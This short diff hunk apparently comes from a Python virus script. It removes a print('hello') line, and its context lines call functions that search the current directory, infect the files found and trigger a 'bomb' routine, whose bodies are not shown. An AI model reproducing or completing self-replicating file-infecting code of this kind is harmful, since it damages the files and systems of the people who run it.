@@ -37,4 +37,3 @@ def bomb():
 filestoinfect = search(os.path.abspath(""))
 infect(filestoinfect)
 bomb()
-print("hello")
